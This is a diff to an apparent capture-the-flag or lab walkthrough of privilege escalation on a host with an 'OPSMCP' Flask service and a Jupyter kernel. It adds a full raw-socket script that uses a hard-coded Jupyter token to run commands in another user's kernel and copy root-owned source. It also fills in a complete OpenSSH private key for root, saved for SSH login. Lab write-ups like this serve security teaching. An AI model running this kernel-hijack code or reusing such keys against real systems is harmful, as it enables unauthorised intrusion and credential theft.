@@ -246,7 +246,46 @@ cat /tmp/flag.txt
 The OPSMCP Flask service on port 5000 runs as root and requires an `X-API-Key` header. Direct file access to `/opt/opsmcp/server.py` is not available as `mcp-dev`, but the Jupyter kernel running as `analyst` can read it. The same WebSocket execution technique is reused with a different payload:
 
 ```python
-"code": "import os; os.system('cat /opt/opsmcp/server.py > /tmp/src.txt')"
+python3 << 'EOF'
+import socket, base64, os, json, struct, uuid, time
+
+TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+KERNEL_ID = "65ab938e-944f-44b8-a973-77356ae34c50"
+
+key = base64.b64encode(os.urandom(16)).decode()
+upgrade = (
+    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
+    f"Host: localhost:8888\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+    f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
+)
+
+s = socket.socket()
+s.connect(("localhost", 8888))
+s.send(upgrade.encode())
+s.recv(4096)
+
+msg = json.dumps({
+    "header": {"msg_id": str(uuid.uuid4()), "msg_type": "execute_request",
+               "username": "", "session": str(uuid.uuid4()), "version": "5.0"},
+    "parent_header": {}, "metadata": {},
+    "content": {"code": "import os; os.system('cat /opt/opsmcp/server.py > /tmp/src.txt')", "silent": False}
+})
+
+payload = msg.encode()
+length = len(payload)
+mask_key = os.urandom(4)
+masked = bytearray([payload[i] ^ mask_key[i % 4] for i in range(length)])
+
+if length <= 125:
+    header = struct.pack('!BB', 0x81, 0x80 | length) + mask_key
+elif length <= 65535:
+    header = struct.pack('!BBH', 0x81, 0xFE, length) + mask_key
+else:
+    header = struct.pack('!BBQ', 0x81, 0xFF, length) + mask_key
+
+s.send(header + masked)
+time.sleep(5)
+EOF
 ```
 
 ```bash
@@ -278,7 +317,31 @@ The response contains root's RSA private key.
 ```bash
 cat > /tmp/root_key << 'EOF'
 -----BEGIN OPENSSH PRIVATE KEY-----
-<key data>
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
+G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
+8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
+6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
+Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
+7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
+v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
+ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
+gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
+qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
+V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
+0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
+JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
+HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
+dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
+Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
+nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
+Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
+MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
+oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
+Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
+nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
+C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
+lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
 -----END OPENSSH PRIVATE KEY-----
 EOF
 chmod 600 /tmp/root_key
